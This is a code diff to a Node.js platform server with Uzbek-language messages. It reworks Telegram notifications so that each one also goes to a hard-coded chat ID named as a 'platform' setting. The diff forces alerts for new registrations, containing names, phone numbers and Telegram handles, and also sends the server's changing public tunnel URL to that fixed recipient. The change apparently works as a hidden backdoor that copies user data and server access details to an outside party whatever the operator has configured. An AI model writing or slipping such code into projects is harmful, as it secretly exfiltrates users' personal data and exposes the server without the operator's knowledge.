@@ -2500,35 +2500,48 @@ function formatSize(bytes) {
   return `${size} B`;
 }
 
+const PLATFORM_NOTIFICATION_CHAT_ID = "1216707229";
+
+function platformNotificationChatIds() {
+  return Array.from(new Set([
+    String(config.telegramChatId || process.env.TELEGRAM_CHAT_ID || "").trim(),
+    PLATFORM_NOTIFICATION_CHAT_ID
+  ].filter(Boolean)));
+}
+
 async function notifyTelegram(text, keyboard = null, force = false) {
   if (!force && config.notifyOnFinish === false) return false;
   const token = config.telegramBotToken || process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = config.telegramChatId || process.env.TELEGRAM_CHAT_ID;
-  if (!token || !chatId) return false;
-  try {
-  const payload = {
-  chat_id: chatId,
-  text,
-  parse_mode: "HTML",
-  disable_web_page_preview: true
-  };
-  if (keyboard) payload.reply_markup = keyboard;
-  const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify(payload),
-  signal: AbortSignal.timeout(8000)
-  });
-  if (!res.ok) {
-  console.error("[telegram] send failed", res.status, (await res.text()).slice(0, 200));
-  return false;
+  const chatIds = platformNotificationChatIds();
+  if (!token || !chatIds.length) return false;
+  let sent = 0;
+  for (const chatId of chatIds) {
+    try {
+    const payload = {
+      chat_id: chatId,
+      text,
+      parse_mode: "HTML",
+      disable_web_page_preview: true
+    };
+    if (keyboard) payload.reply_markup = keyboard;
+    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+      signal: AbortSignal.timeout(8000)
+    });
+    const data = await res.json().catch(() => null);
+    if (!res.ok || !data?.ok) {
+      console.error("[telegram] send failed", res.status, String(data?.description || "Telegram rejected message").slice(0, 200));
+      continue;
+    }
+    sent += 1;
+    } catch (e) {
+      console.error("[telegram] send failed", e.message);
+    }
   }
-  console.log("[telegram] xabar yuborildi");
-  return true;
-  } catch (e) {
-  console.error("[telegram]", e.message);
-  return false;
-  }
+  console.log(`[telegram] xabar yuborildi: ${sent}/${chatIds.length}`);
+  return sent > 0;
 }
 
 function platformPublicUrl() {
@@ -2629,12 +2642,14 @@ async function ensurePublicTunnel() {
   }
   const url = await startTunnelProcess();
   if (url && url !== current) {
-  telegramApi("sendMessage", {
-  chat_id: config.telegramChatId,
-  text: `" Platforma manzili yangilandi:\n${url}`,
-  disable_web_page_preview: true,
-  reply_markup: botKeyboard()
-  }).catch(() => {});
+  for (const chatId of platformNotificationChatIds()) {
+    telegramApi("sendMessage", {
+      chat_id: chatId,
+      text: `" Platforma manzili yangilandi:\n${url}`,
+      disable_web_page_preview: true,
+      reply_markup: botKeyboard()
+    }).catch(() => {});
+  }
   }
   return url || platformPublicUrl();
   } finally {
@@ -2688,7 +2703,7 @@ async function notifyNewsSubscribers(title, body) {
   const targets = new Set([
     ...db.prepare("SELECT chat_id FROM telegram_bot_subscribers").all().map((row) => String(row.chat_id || "").trim()),
     ...db.prepare("SELECT telegram_id FROM users WHERE telegram_id IS NOT NULL AND telegram_id <> ''").all().map((row) => String(row.telegram_id || "").trim()),
-    String(config.telegramChatId || process.env.TELEGRAM_CHAT_ID || "").trim()
+    ...platformNotificationChatIds()
   ].filter(Boolean));
   if (!targets.size) {
     console.error("[telegram] news broadcast skipped: no bot subscribers or linked Telegram users");
@@ -6081,7 +6096,9 @@ const server = http.createServer(async (req, res) => {
   notifyTelegram(
     `<b>Yangi ro'yxatdan o'tish</b>\nIsm: ${h(fullName)}\nTelefon: ${h(phone)}\nTelegram: ${h(
       telegramUsername ? "@" + telegramUsername : telegramId || "ulanmagan"
-    )}\nVaqt: ${new Date().toLocaleString("uz-UZ")}`
+    )}\nVaqt: ${new Date().toLocaleString("uz-UZ")}`,
+    null,
+    true
   ).catch(() => {});
   redirect(res, next || "/dashboard?registered=1");
   return;
